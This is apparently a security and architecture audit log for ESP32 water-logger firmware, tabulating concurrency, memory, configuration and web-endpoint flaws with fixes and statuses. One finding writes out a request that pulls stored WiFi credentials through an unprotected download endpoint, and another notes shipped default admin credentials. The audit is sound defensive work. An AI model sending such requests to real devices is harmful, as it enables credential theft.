# ESP32 Water Logger — Security & Architecture Audit Log

Persistent record of findings across all audit phases. Severity scale: **C**ritical / **H**igh / **M**edium / **L**ow / **I**nfo.

---

## Phase 1 — setup() / Hardware Init / LittleFS / RTC

Files: `ESP_Logger.ino`, `src/managers/HardwareManager.*`, `src/managers/StorageManager.*`, `src/managers/RtcManager.*`, `src/managers/ConfigManager.*`, `src/core/Globals.*`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 1.1 | H | ESP_Logger.ino:468-476 — `digitalRead()` over GPIO 0-10/18-21 before `pinMode()` runs (initHardware at L526). earlyGPIO_bitmask undefined on cold boot. | Move pinMode for wake pins above the earlyGPIO loop, or accept floating-input semantics in `getWakeupReason` (already has fallback). | Fixed (#88) |
| 1.2 | H | ESP_Logger.ino:472-473 — Snapshot includes GPIO18-19 (USB D+/D- on C3 SuperMini). Plugged USB skews bitmask. | Skip 18-19 when `CONFIG_IDF_TARGET_ESP32C3 && USB CDC on Boot`. | Fixed (#88) |
| 1.3 | H | HardwareManager.cpp:72 — `pinMode(pinFlowSensor, INPUT)` with no pull. YF-S201 needs INPUT_PULLUP. | `pinMode(config.hardware.pinFlowSensor, INPUT_PULLUP);` | Fixed (#88) |
| 1.4 | M | HardwareManager.cpp:56-60 — `isPinSafe` lambda declared but never invoked in initHardware(). | Validate each `config.hardware.pin*` against isPinSafe; clamp to DefaultPins on failure. | Pending |
| 1.5 | C | HardwareManager.cpp:8-22 — `onFFButton`/`onPFButton` ISRs and `ffPressed`/`pfPressed` flags exist but never attached anywhere. Dead code in IRAM. | Either register via attachInterrupt for wake pins or delete the ISR + flag declarations. | Fixed (#88) |
| 1.6 | C | ESP_Logger.ino:612-618 — In non-legacy mode mutexes depend on `TaskManager::init()`. On init failure, ApiHandlers calls `xSemaphoreTake(NULL)` → assert. | Move mutex creation BEFORE `TaskManager::init()` so they survive task-init failure; or refuse to start web server when init returns false. | Fixed (#88) |
| 1.7 | C | StorageManager.cpp:12 + ConfigManager.cpp:361 — `LittleFS.begin(true, ...)` with `formatOnFail=true`. Transient corruption silently reformats partition. | Set formatOnFail=false; expose a `/factory_reset` confirmation path for format. | Fixed (#88) |
| 1.8 | H | ConfigManager.cpp:529-558 — `saveConfig()` proceeds to write even when fsMutex acquire times out. | Return false on mutex timeout; do NOT write. Or use longer timeout. | Fixed (#79) |
| 1.9 | H | ConfigManager.cpp:563 — `moduleRegistry.saveAll(LittleFS)` called AFTER releasing fsMutex; saveAll never takes it. | Move saveAll BEFORE `xSemaphoreGive(fsMutex)` or have saveAll acquire the mutex internally. | Fixed (#79) |
| 1.10 | M | RtcManager.cpp:27-28 — `delete rtcWire` before `delete Rtc`. Rtc dtor may dereference dangling _wire reference. | Swap order: `delete Rtc; Rtc = nullptr; delete rtcWire; rtcWire = nullptr;` (delete BEFORE nulling, else leak). | Pending |
| 1.11 | M | RtcManager.cpp:71-77 — `backupBootCount` writes magic byte FIRST then bootcount bytes. Partial write leaves valid magic + bad value. | Write 4 bootcount bytes first, then magic last. Reverse order in backupBootCount. | Pending |
| 1.12 | L | RtcManager.cpp:46 — `RtcDateTime(__DATE__, __TIME__)` fallback regresses wall clock on every reflash. | Use 2024-01-01 00:00:00 baseline; surface "time invalid" in UI. | Pending |
| 1.13 | M | ESP_Logger.ino:540 — `_writeResetLog()` runs AFTER `bootCount++`. Reason for reset N logged under boot N+1. | Move `_writeResetLog()` BEFORE the `bootCount++` increment. | Pending |
| 1.14 | M | ESP_Logger.ino:543 — `OtaManager::boot()` runs after _writeResetLog. If FS op crashes, rollback never armed. | Move `OtaManager::boot()` to immediately after `Serial.begin`. | Pending |
| 1.15 | M | ESP_Logger.ino:329 — `_checkPinConflicts` reads entire platform_config.json without size cap. | Add `if (f.size() > 16*1024) return;` before `deserializeJson`. | Pending |
| 1.16 | M | ESP_Logger.ino:264-275 — `_detectPlatformMode` OOM silently downgrades to LEGACY. | Log error via Serial; ESP.restart() rather than mode regression on OOM. | Pending |
| 1.17 | L | ESP_Logger.ino:498-503 — Corrupt modules.json: `loadAll` returns false, `exists()` true → `saveAll` not called. File rot forever. | Quarantine: on parse fail rename to `.corrupt`, then call saveAll. | Pending |
| 1.18 | L | ESP_Logger.ino:485 — `isrDebounceUs` assignment is dead (button ISRs never attached). | Delete the line; remove `isrDebounceUs` global. | Pending |

---

## Phase 2 — FreeRTOS Tasks / ISRs / DataPipeline

Files: `src/tasks/*`, `src/pipeline/*`, `src/sensors/plugins/WaterFlowSensor.cpp`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 2.1 | C | TaskManager.cpp:32 + ESP_Logger.ino:454 — `bool` return of `init()` ignored. Caller proceeds with NULL queues. | `if (!TaskManager::init(*activeFS)) { shouldRestart = true; return; }` | Fixed (#88) |
| 2.2 | H | TaskManager.cpp:33-155 — Partial-init failure paths leak created queues/mutexes/tasks; leaves `running=true`. | Add cleanup block: delete queues, give mutexes, delete tasks before each `return false`. | Fixed (#88) |
| 2.3 | H | TaskManager.cpp:33 — `running = true` set BEFORE queues exist. Window of TaskManager::running=true / sensorQueue=NULL. | Move `running = true` to just before final `return true`. | Fixed (#88) |
| 2.4 | H | TaskManager.cpp:130-150 init order — SensorTask + ProcessingTask created BEFORE StorageTask. storageQueue can fill before consumer exists. | Create StorageTask FIRST, then ExportTask, then producers (Sensor/SlowSensor/Process). | Fixed (#88) |
| 2.5 | H | TaskManager.cpp:178 hard wait `pdMS_TO_TICKS(500)` shorter than SlowSensorTask's 500ms poll. Task can wake post-shutdown into freed memory. | Loop on `eTaskGetState() == eDeleted` per task, or wait 1.5× SlowSensorTask's poll. | Fixed (#88) |
| 2.6 | C | WaterFlowSensor.cpp:41 — `gpio_isr_handler_add(pin, _isr, this)` with NO `gpio_isr_handler_remove` in dtor. `SensorManager::reloadConfig` deletes sensor → ISR fires on dangling `this`. | Add destructor: `gpio_isr_handler_remove((gpio_num_t)_pin);` | Fixed (#81) |
| 2.7 | H | StorageTask.cpp:99,109,122 — `fsMutex` taken with `portMAX_DELAY`. Blocked SD pull → wedge for >30s, C4 watchdog resets. | Use `pdMS_TO_TICKS(3000)`; on timeout skip the write iteration and bump g_queueDrops. | Fixed (#79) |
| 2.8 | H | ProcessingTask.cpp:48 — `xSemaphoreTake(webDataMutex, 0)` best-effort. Web reads cause silent ring-push drops. | Use `pdMS_TO_TICKS(5)`; or count drops in `g_ringDrops`. | Fixed (#79) |
| 2.9 | H | ProcessingTask.cpp:67 — exportQueue send with timeout 0 → silent drops on WiFi backpressure. | Use `pdMS_TO_TICKS(10)`; the existing `g_queueDrops` counter is fine. | Fixed (#88) |
| 2.10 | M | DataPipeline.cpp:13 — `volatile uint32_t g_queueDrops` incremented from 2+ tasks. RMW not atomic. | `std::atomic<uint32_t> g_queueDrops;` and `g_queueDrops.fetch_add(1, std::memory_order_relaxed);` | Pending |
| 2.11 | M | DataPipeline.h:47-72 RingBuffer marked SPSC but writer uses try-take webDataMutex; struct memcpy of 72B not torn-write safe on dual-core. | Either always serialize through webDataMutex, or add per-slot sequence counter. | Pending |
| 2.12 | M | DataPipeline.h:101-124 `collectMetricSeries` self-aliasing memmove pattern. Source/dest overlap when count > maxOut/2. | Use `memmove(out, out+maxOut-count, count*sizeof(float));` | Pending |
| 2.13 | M | HardwareManager.cpp:27 — `pulseCount++` in ISR is not atomic on RV32. | `__atomic_fetch_add(&pulseCount, 1, __ATOMIC_RELAXED);` | Pending |
| 2.14 | M | TaskManager.cpp:193-209 — `hb == 0` treated as "not started" indefinitely; deadlocked task at line 16 never tripped. | Seed each heartbeat slot in init() with `millis()`; remove the `hb==0` exemption. | Pending |
| 2.15 | M | SensorTask.cpp:24-28, SlowSensorTask:21-25, StorageTask:17-24 — three copies of `nowEpochSafe`. NTP jump at runtime corrupts LiveAggregator._lastFlushEpoch. | Centralize in `pipeline/TimeSource.cpp`. Detect epoch jumps > 86400 and rebase _lastFlushEpoch. | Pending |
| 2.16 | M | TaskManager.cpp:115-126 — Mirror mode holds fsMutex for primary + mirror appendRow. SD writes block 50-100ms. | Release fsMutex between primary and mirror, or use dedicated mirrorFsMutex. | Pending |
| 2.17 | L | LiveAggregator.cpp:198-201 — `_lastFlushEpoch = nowEpoch` on first call. NTP jump after that causes no rows until next jump anchor. | Guard with monotonic millis() in parallel; flush when EITHER threshold passes. | Pending |
| 2.18 | L | ExportTask.cpp:50 — Shutdown flush calls `exportManager.sendAll` (blocking TLS HTTP) inside task-exit path. ESP.restart can race. | Skip final flush on shutdown (`if (running && batchCount > 0)`), or cap to 1s. | Pending |
| 2.19 | M | AlertEngine.evaluate called from ProcessingTask.cpp:57 with no caller-side mutex. `handleApiAlertsSave` mutates rules concurrently. | AlertEngine must take its internal `_mutex` in evaluate() (verify in Phase 15). | Pending |

---

## Phase 3 — WebServer.cpp / ApiHandlers.cpp

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 3.1 | C | WebServer.cpp:1383 `/factory_reset` — no CSRF, no rate limit. LAN attacker can wipe device with one POST. | Add `if (!requireMutatingAuth(r)) return;` as first statement (R5). | Fixed (#80) |
| 3.2 | C | WebServer.cpp:1404 `/restart` — no CSRF (rate limited only). | `requireMutatingAuth` replaces bare `rateLimit429` (R5). | Fixed (#80) |
| 3.3 | C | WebServer.cpp:1811 `/do_update` (OTA) — no CSRF, no rate limit. | `requireMutatingAuth` added to request callback (R5); body callback unchanged per policy. | Fixed (#80) |
| 3.4 | H | WebServer.cpp:1336 `/sync_time`, 1355 `/rtc_protect`, 1363 `/flush_logs`, 1368 `/backup_bootcount`, 1373 `/restore_bootcount` — no rate limit, no CSRF. | `requireMutatingAuth` added as first statement to all five (R5). | Fixed (#80) |
| 3.5 | H | WebServer.cpp:1750 `/wifi_scan_start`, 1757 `/wifi_scan_result` — no CSRF; mutates WiFi mode. | `requireMutatingAuth` added to `/wifi_scan_start` (R5); `/wifi_scan_result` is read-only, untouched. | Fixed (#80) |
| 3.6 | C | WebServer.cpp:1415 `/download` — does not call `isPathProtected`. `/download?file=/config.bin` leaks WiFi creds. | After sanitizePath: `if (isPathProtected(path)) { r->send(403,...); return; }` | Fixed (#89) |
| 3.7 | C | WebServer.cpp:1022-1024 `/export_settings` — emits `apPassword`/`clientPassword` plaintext. | Replace passwords with `"***"` mask; require explicit opt-in param to include them. | Fixed (#89) |
| 3.8 | C | ApiHandlers.cpp:236 — `new SensorReading[MAX_RAW]` without `std::nothrow`. bad_alloc → abort. | Use `new(std::nothrow)` and null-check. | Fixed (#89) |
| 3.9 | H | ApiHandlers.cpp:73-130 — `raw` AND `agg` both allocated even when historicalPath sets aggCount=0. ~34 KB transient peak. | Allocate `agg` only after path decision; defer `raw` allocation when ring is empty. | Fixed (#89) |
| 3.10 | M | ApiHandlers.cpp:53-58 — sensorFilter/metricFilter c_str() captured but inconsistent with the lifetime fix applied to agg/mode at line 106-112. | Apply the same copy-to-local-buffer pattern. | Pending |
| 3.11 | M | ApiHandlers.cpp:611-647 wifi-test — globals updated without atomic_thread_fence. Reader can see WT_SUCCESS with stale ip/rssi. | `std::atomic<WifiTestState> g_wtState;` with release/acquire. | Pending |
| 3.12 | H | WebServer.cpp:1653 `static String _importBuf` — shared across concurrent /import_settings uploads. Interleave corrupts JSON. Never reset on disconnect. | Move to `request->_tempObject`; clear on disconnect. | Fixed (#89) |
| 3.13 | C | WebServer.cpp:1389 `/factory_reset` — `xSemaphoreTake(fsMutex, 2000)` return value discarded; unconditional `xSemaphoreGive` at 1395 asserts on un-held mutex. | Capture return; only give if take succeeded. | Fixed (#79) |
| 3.14 | H | WebServer.cpp:1608 — Upload fsMutex held for entire body (potentially MB). | Take mutex per chunk write only; release between writes. | Fixed (#89) |
| 3.15 | H | WebServer.cpp:1396 `safeWiFiShutdown()` runs from AsyncTCP worker with 300ms of delays + WIFI_OFF. Tears down own netif. | Schedule via `shouldRestart=true` flag; perform shutdown from loop(). | Fixed (#89) |
| 3.16 | M | ApiHandlers.cpp:488-493 `/api/ota/rollback` — `delay(200)` on AsyncTCP worker. | Use deferred flag like NTP sync pattern. | Pending |
| 3.17 | M | WebServer.cpp:1289-1330 `/set_time` — ~120ms of `delay()` in RTC writes from AsyncTCP worker. | Move RTC mutation to loop() deferred handler. | Pending |
| 3.18 | M | WebServer.cpp:1422 `/download` TOCTOU between exists() and beginResponse(). | Null-check `resp` before `addHeader`. | Pending |
| 3.19 | H | ApiHandlers.cpp:312-321 `/api/config/platform` — holds configMutex but SensorTask iterates sensor table WITHOUT configMutex. Use-after-free on reload. | Wrap `sensorManager.tickFiltered` body in configMutex, OR signal quiesce flag. | Fixed (#90) |
| 3.20 | M | ApiHandlers.cpp:807-873 `/api/backup` — takes configMutex but inhaleJsonFile reads files without fsMutex. | Acquire fsMutex around each `inhaleJsonFile` call. | Pending |
| 3.21 | L | `_doSleep` (ESP_Logger.ino:175-193) — does not call `safeWiFiShutdown`. Hybrid path at 1019 only conditional. | Always call safeWiFiShutdown in _doSleep if WiFi.getMode() != WIFI_OFF. | Pending |

---

## Phase 4 — Frontend ↔ Backend Contract (www/)

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 4.1 | C | iot-extensions.js:705-715 — `/api/sensors` returns `{sensors:[...]}` but populateHealthPage expects raw Array. Health page renders nothing. | `var sensors = (data && data.sensors) || []; if (!sensors.length) return; renderHealthGrid(sensors);` | Fixed (#89) |
| 4.2 | M | sensors.js:104 — reads `d.last_sweep_ms` which backend never emits. | Emit `last_sweep_ms` from SensorManager::toJson; OR remove the UI label. | Pending |
| 4.3 | C | pages.js:812-822 `filesDelete` — sends GET to /delete (backend only registers POST). All Files-page deletions silently 405. | Add `{ method: "POST" }` to fetch options. | Fixed (#89) |
| 4.4 | H | pages.js:812,877,901,865 — file ops send no CSRF token (matches backend gap from 3.4). | Add CSRF param + retry logic on 403. | Fixed (#89) |
| 4.5 | C | settings.js:1525 `/do_update` — no CSRF. otaInit and otaUpload run without CSRF auth. | Backend: `requireMutatingAuth` added to `/do_update` request callback (R5). Frontend FormData CSRF append still pending. | Partial (#80) — frontend csrf append still needed |
| 4.6 | H | settings.js:1665 `Modules.save` — JSON body, no `csrf` param. CsrfToken::require can't find param in JSON bodies. | Backend: `requireMutatingAuth` added to JSON-body endpoint request callbacks with TODO comment (R5). `?csrf=...` query-string workaround documented; X-CSRF-Token header support still pending. | Partial (#80) — JSON-body CSRF via header still pending |
| 4.7 | C | iot-extensions.js:603 POST /api/alerts — no CSRF token. Whole alert ruleset can be replaced unauthenticated. | Add `csrf` param; backend should also call `csrfBlock`. | Fixed (#89) |
| 4.8 | H | All `fetch()` / `XMLHttpRequest` — no AbortController, no `xhr.timeout`. UI hangs forever on backend deadlocks. | Wrap fetches in `Promise.race(fetch, timeout(15000))`; set `xhr.timeout = 60000` for uploads. | Fixed (#89) |
| 4.9 | M | settings.js:1404 otaUpload XHR — no timeout. Mid-flash crash hangs UI. | `xhr.timeout = 120000; xhr.ontimeout = function() { ... }` | Pending |
| 4.10 | M | pages.js:1000 `/api/live` polling — no in-flight guard. Backend stall queues many requests. | Track `liveInFlight`; skip tick if previous unfinished. | Pending |
| 4.11 | M | pages.js:963-980 EventSource — no client-side keepalive. Silent stall not detected. | Reset a 10s timer on each event; on timeout close+reopen. | Pending |
| 4.12 | M | core.js:438-451 CSRF cache — only `settingsSave` retries on 403. Other call sites do not. | Centralize: every mutating fetch uses a `postWithCsrf()` helper. | Pending |
| 4.13 | H | settings.js:1349 `_otaSha256` — SubtleCrypto unavailable on `http://` (Secure Context spec). AP mode always returns empty hash → server skips SHA-256 verification silently. | Detect missing SubtleCrypto; warn user; require manual hash entry; OR fall back to JS-side SHA implementation. | Fixed (#89) |
| 4.14 | M | WebServer.cpp:1278 `/save_time` — writes timezone but never `dstOffsetHours`. UI never reads/writes it. DST stuck at 0. | Add `dstOffsetHours` param parse + UI input. | Pending |
| 4.15 | L | settings.js (network init) — `/export_settings` leaks plaintext passwords into hidden form fields. DevTools reveals. | Tied to 3.7; once masked, UI must request unmask explicitly. | Pending |
| 4.16 | L | pages.js:686 — filelist `truncated` flag from backend never read in UI. >500 files: silent partial list. | Render "showing first 500" banner when `d.truncated`. | Pending |

---

## Phase 5 — Build & Config Headers

Files: `arduino_build_flags.h`, `setup.h`, `core/Config.h`, `core/SensorTypes.h`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 5.1 | M | setup.h:121 `DEFAULT_FLOW_PIN 4` vs Config.h:62 `DefaultPins::FLOW_SENSOR = 21` — disagreeing defaults; setup.h macros never referenced in src/. | Delete `DEFAULT_SDA/SCL/FLOW_PIN` from setup.h or wire them through DefaultPins. | Pending |
| 5.2 | M | setup.h:140-143 `#define CONFIG_FREERTOS_UNICORE 1` — overrides sdkconfig. ABI mismatch with prebuilt IDF .a archive. | Convert to `#if` guard that errors if value disagrees with `__has_include(<sdkconfig.h>)` import. | Pending |
| 5.3 | C | setup.h:246-254 — default `WEB_BASIC_AUTH_USER "admin"` / `WEB_BASIC_AUTH_PASS "admin"` shipped when `WEB_BASIC_AUTH_ENABLED=1`. | `strcmp` cannot run in `#if` (preprocessor has no string compare). Two viable fixes: **(a)** require user to define a sentinel macro, e.g. `#if WEB_BASIC_AUTH_ENABLED && !defined(WEB_BASIC_AUTH_CREDS_OVERRIDDEN)` → `#error "Define WEB_BASIC_AUTH_CREDS_OVERRIDDEN after setting non-default creds"`; **(b)** in a `.cpp` TU compile-time check with C++17: `static_assert(std::string_view{WEB_BASIC_AUTH_USER} != "admin" \|\| std::string_view{WEB_BASIC_AUTH_PASS} != "admin", "Override default basic-auth credentials before enabling AUTH");`. Choose (b) if toolchain is C++17+; else (a). | Pending |
| 5.4 | L | setup.h:92-106 — all five cloud exporters default ENABLED. ~30-40 KB flash bloat unused at runtime. | Default OFF; enable per-deployment via -D flags. | Pending |
| 5.5 | I | setup.h:179-198 — no DRAM budget validation in comments. | Add `static_assert(STACK_SENSOR_TASK + STACK_PROCESS_TASK + ... < 50000, "tasks exceed DRAM budget");` | Pending |
| 5.6 | M | Config.h:13-15 — `VERSION 4.2.0` but ESP_Logger.ino:2 and project docs say v5.1.0. | Bump VERSION_MAJOR/MINOR to match release; update getVersionString. | Pending |
| 5.7 | C | Config.h:62 `FLOW_SENSOR = 21` — GPIO21 = USB D+ on ESP32-C3 SuperMini. Defaults break USB programming. | Switch default to GPIO10 (or another free pin); document per-board overrides. | Fixed (#87) |
| 5.8 | C | Config.h:67-70 — SD pins 10-13. GPIO11-17 are SPI flash on C3 → SD storage broken out of the box. | Document "SD requires non-C3 target"; or change defaults to GPIO0/1/8/9 for compatibility; sanitize SD pins like wake pins. | Fixed (#87) |
| 5.9 | C | Config.h:63-65 — RTC pins 5/6/7 collide with XIAO ESP32-C3 I2C bus (SDA=6, SCL=7). Cannot use DS1302 + I2C sensors simultaneously. | Either move RTC defaults to GPIO20-21 (USB pins, unused if USB CDC off) or document mutual exclusion. | Fixed (#87) |
| 5.10 | M | Config.h:109 `#pragma pack(push, 1)` — unaligned float access on RV32 (e.g. `LoggerConfig::humidityCorrectionKappa` at odd offset). Performance penalty on hot path. | Remove pack; let compiler align; add `static_assert(sizeof(DeviceConfig) < 2048)`. Migration code already uses offsetof, so removing pack changes file format — bump CONFIG_VERSION to 14. | Pending |
| 5.11 | M | Config.h:173-189 — `uint8_t pin*` cannot express -1 "unused". Sensor plugin `cfg["pin"] | -1` casts to 0xFF. | Use `int8_t` for pin fields; -1 = unused; sanitize negatives in load path. | Pending |
| 5.12 | L | Config.h:232 `uint8_t _reserved_lang` — permanently burned byte under pack(1). | Reuse as a future feature flag; rename to `_flags` and document. | Pending |
| 5.13 | L | Config.h:198-205 LoggerConfig has reserved[16]; other appended structs do not. | Add `uint8_t reserved[8]` tail to each *Config struct. | Pending |
| 5.14 | L | Config.h:253 magic 32/512 budget undocumented; misleading since DS1302 RAM is 31 B. | Replace magic numbers with `RTC_SLOW_LOG_BUDGET` macro + comment. | Pending |
| 5.15 | M | Config.h:99-104 `enum LoggingState` — no explicit underlying type. ESP_Logger.ino:1024 relies on signed-int comparison. | `enum LoggingState : int8_t { ... };` | Pending |
| 5.16 | M | SensorTypes.h:29-31 — `SensorReading() { memset(this, 0, sizeof(*this)); }` is UB if any non-trivial member added. | `SensorReading() = default;` with in-class member initializers (`uint32_t timestamp = 0;` etc.). | Pending |
| 5.17 | H | SensorTypes.h:55-61 `toJsonLine()` emits unescaped `%s` for sensorId/sensorType/metric/unit. User-supplied sensorId via platform_config.json can inject JSON. | Implement `jsonEscape(out, dst, dstLen)` helper; escape every string field before snprintf. | Fixed (#92) |
| 5.18 | L | SensorTypes.h:86-94 / 113-122 parseBucket/parseMode case-sensitive lowercase only. | Lowercase the input first; or document the requirement in the API spec. | Pending |
| 5.19 | I | SensorTypes.h:67-74 AggMode enum — values stored numerically in JSON config. Inserting AGG_MEDIAN between LTTB and SUM would silently reassign historical configs. | Add comment "APPEND-ONLY; never renumber". | Pending |

---

## Phase 6 — Core Globals & Module Framework

Files: `core/Globals.*`, `core/IModule.h`, `core/ModuleRegistry.*`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 6.1 | M | Globals.cpp:9 — `AsyncWebServer server(80)` static-init constructor; port hard-coded; static init order across TUs is undefined. | Wrap in `getServer()` accessor with function-local static; expose port via `setup.h` macro. | Pending |
| 6.2 | M | Globals.cpp:33-36 — RTC_DATA_ATTR initializers are applied by 2nd-stage bootloader only on cold boot. No magic-word guard on `logBufferCount`. | Add `RTC_DATA_ATTR uint32_t rtcMagic;` checked at boot; on mismatch, zero `logBuffer[]` and `logBufferCount`. | Pending |
| 6.3 | H | Globals.h:50-51 — `extern String wakeUpButtonStr` / `cycleStartedBy` mutated from loop() AND read by AsyncTCP worker (WebServer.cpp:117). String buffer pointer triple is not atomic → UAF read. | Replace with `char wakeUpButtonStr[16]` + `char cycleStartedBy[16]`; or guard with webDataMutex on every access. | Fixed (#90) |
| 6.4 | I | Globals.h:74 `volatile uint32_t pulseCount` — restated from 2.13. Same fix. | See 2.13. | Pending |
| 6.5 | L | Globals.h:106 `PlatformMode g_platformMode` non-volatile/non-atomic. Single-byte enum, but C++ memory model requires atomic for cross-task visibility. | `std::atomic<uint8_t> g_platformMode;` reads/writes via .load()/.store(memory_order_acquire/release). | Pending |
| 6.6 | I | Globals.cpp:75 `isrDebounceUs` — dead variable (button ISRs unused). Restated from 1.18. | Delete. | Pending |
| 6.7 | I | Globals.h — 130+ extern globals form the architectural antipattern driving multi-task races. | Long-term: refactor to subsystem-owner pattern (each manager exposes accessor functions). | Pending |
| 6.8 | M | IModule.h:42-43 — Asymmetric error reporting: `load()` returns bool, `save()` returns void. JSON capacity overflow silently truncates. | `virtual bool save(JsonObject cfg) const = 0;` and propagate to ModuleRegistry::saveAll. | Pending |
| 6.9 | L | IModule.h:54 — `tick(uint32_t nowMs)` never called. Dead virtual misleads module authors. | Either wire a `tickAll()` from main loop / a TickerTask, or remove the method. | Pending |
| 6.10 | L | IModule.h:75 — schema() return is unvalidated; malformed JSON silently breaks the UI (settings.js:1702). | Add `bool validateSchema(const char* s)` helper called at registration time in `ModuleRegistry::add`. | Pending |
| 6.11 | C | ModuleRegistry.cpp:130-138 `startAll()` exists but is NEVER CALLED at boot. Modules that perform setup in start() silently don't initialize. | Add `moduleRegistry.startAll();` to ESP_Logger.ino:setup() after `loadAll`. | Fixed (#92) |
| 6.12 | H | ModuleRegistry.cpp:78 — `_modules[i]->load(slice)` return value DISCARDED. Validation failures silently swallowed; module ends up enabled with garbage. | `bool ok = _modules[i]->load(slice); if (!ok) { Serial.printf("[ModuleRegistry] %s load() failed\n", id); _modules[i]->setEnabled(false); }` | Fixed (#92) |
| 6.13 | M | ModuleRegistry.cpp:63-67 — Parse error leaves corrupt modules.json untouched; subsequent boots load defaults silently forever. | Quarantine: `fs.rename(path, "/config/modules.json.corrupt"); saveAll(fs, path);` | Pending |
| 6.14 | H | ModuleRegistry.cpp:110 — `serializeJson` short-write check only catches `n == 0`. Truncated-but-nonzero output passes through rename. | Compare against `measureJson(doc)`; abort + remove tmp if shorter. | Fixed (#92) |
| 6.15 | M | ModuleRegistry.cpp:36-44 + 84-127 — saveAll does not take fsMutex; loadAll's crash-recovery rename also unlocked. | Acquire `fsMutex` at function entry of saveAll; expose `MutexGuard` helper for symmetry. | Pending |
| 6.16 | L | ModuleRegistry.cpp:116-120 comment promises atomic rename on LittleFS but the class accepts any `fs::FS&`. SD/FAT rename-over-existing fails. | Add probe: if `fs.exists(path)` → `fs.remove(path)` first when target FS != LittleFS. | Pending |
| 6.17 | M | ModuleRegistry.cpp:55-60 — Oversize-file rejection returns false but doesn't quarantine. File stays oversize across reboots. | Same fix as 6.13. | Pending |

---

## Phase 7 — Web Auth & Utilities

Files: `utils/Utils.*`, `web/CsrfToken.*`, `web/RateLimiter.*`, `web/WebServer.h`, `web/ApiHandlers.h`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 7.1 | H | Utils.cpp:69-76 `isPathProtected` — only covers `/config.bin`, `/bootcount.bin`, `/reset_log.txt`, `/_setup`. Misses `/alerts.json`, `/platform_config.json`, `/config/modules.json`, `/config/sensors.json`, `/config.tmp`. All deletable + downloadable. | Extend list; add prefix check for `/config/` directory; protect `/platform_config.json`; remove `/config.tmp` if found stale. | Fixed (#92) |
| 7.2 | L | Utils.cpp:30 — control-char filter only checks `< 0x20` and `0x7f`. Bytes 0x80-0xFF (UTF-8 lead bytes, non-ASCII) pass. Not a security issue but allows weird filenames. | Document as design choice or restrict to ASCII printable. | Pending |
| 7.3 | L | Utils.cpp:57 `sanitizeFilename` 64-char cap. Generated datalog filenames (prefix + device id + timestamp + .txt) can approach 50-60 chars; close margin. | Bump to 96 chars; verify all generator paths against new limit. | Pending |
| 7.4 | M | Utils.cpp:83-134 `deleteRecursive` uses heap `std::vector` work-stack with no size cap. A crafted/corrupt FS tree with many directories can OOM the AsyncTCP worker. | Add `if (stack.size() > 256) return false;` to abort deep recursion. | Pending |
| 7.5 | M | CsrfToken.cpp:7-21 `ensureToken()` — two concurrent first `/api/csrf-token` requests can both pass `if (s_token[0]) return;` and interleave the 16 esp_random() writes. Single AsyncTCP worker mitigates today, but the function is callable from `require()` on any mutating handler. | Add a guard byte set BEFORE the loop: `static volatile bool initialised = false; if (initialised) return;` then write s_token, then `initialised = true;` with proper barrier. | Pending |
| 7.6 | M | CsrfToken — Token never expires within a boot session. A plaintext-HTTP capture remains valid until reboot. Combined with no HTTPS option, sniffed token = full mutating-API access. | Rotate token after N hours OR after every successful mutating request (one-shot tokens). | Pending |
| 7.7 | M | CsrfToken.h:33-35 — `csrfBlock(req)` returns inverse of `require()`. Reads "blocked when require failed" but semantic naming is backwards (`require` true = OK; `csrfBlock` true = failure). High maintenance footgun. | R5 eliminates direct `csrfBlock` calls from all handlers (funneled through `requireMutatingAuth`); `csrfBlock` function rename/removal is a follow-up. | Partial (#80) — csrfBlock function rename still pending |
| 7.8 | H | CsrfToken.cpp:52-56 — looks for `csrf` only in form/query params, never headers. JSON-body endpoints (POST /api/modules/:id, POST /api/alerts) have no parsed params → check always fails. Mirrors Phase 4 #4.6 root cause. | R5: `requireMutatingAuth` added to JSON-body request callbacks; TODO comments document `?csrf=...` query-string workaround. X-CSRF-Token header support still pending. | Partial (#80) — JSON-body CSRF via header still pending |
| 7.9 | L | CsrfToken — GET `/api/csrf-token` is unauthenticated (WebServer.cpp:678). Anyone on AP can fetch token. By design per CsrfToken.h:14-20 double-submit pattern; flagged because it pairs poorly with plaintext HTTP. | Document the threat model; recommend WEB_BASIC_AUTH_ENABLED + HTTPS reverse-proxy for internet exposure. | Pending |
| 7.10 | L | RateLimiter.h:21-32 `allow()` — read-modify-write on `_tokens`/`_lastRefill` not thread-safe. Single AsyncTCP worker context masks the race today. | `std::atomic<uint32_t>` with `compare_exchange_weak` loop. | Pending |
| 7.11 | M | RateLimiter — single global bucket. One client can starve every other client. No per-IP tracking. | For LAN single-user devices this is acceptable; document. If concern: add a 4-entry LRU per-IP bucket map. | Pending |
| 7.12 | L | RateLimiter.cpp:6-7 — `_tokens = MAX_TOKENS` at static-init, `_lastRefill = 0`. First call from boot (millis()=N) computes elapsed=N, add=N/200, clamped to 20. First 20 requests within first second always succeed regardless of true rate. | Initialise `_lastRefill = millis()` at start of `allow()` if zero. | Pending |
| 7.13 | I | RateLimiter only applies to mutating handlers (each calls `rateLimit429` explicitly). Read endpoints (`/api/status`, `/api/live`, `/api/data`) are unbounded. | AsyncTCP worker is the implicit limiter; acceptable. Consider per-endpoint caps on heavy reads (`/api/data` with limit=300 allocates ~17 KB). | Pending |
| 7.14 | I | WebServer.h / ApiHandlers.h — Trivial header declarations; documentation lists Bulgarian descriptions. | [MODULE SAFE] | N/A |

---

## Phase 8 — HW / Storage / RTC / WiFi Manager Headers

Files: `managers/HardwareManager.*`, `managers/StorageManager.h` (+ cpp re-pass), `managers/RtcManager.*`, `managers/WiFiManager.h`

| # | Severity | Issue | Fix | Status |
|---|---|---|---|---|
| 8.1 | H | HardwareManager.cpp:36-48 `debounceButton` — `lastFFDebounceTime`/`lastPFDebounceTime` initialised to 0 in Globals.cpp:60-61. First call from loop() sees `millis() - 0 > debounceMs` always TRUE. If pin reads ACTIVE on power-on (button held during boot), counter immediately latches → spurious cycle start. | Initialise `lastFFDebounceTime = lastPFDebounceTime = millis()` in initHardware() AFTER pinMode. Also seed `last*ButtonState` from current digitalRead. | Fixed (#93) |
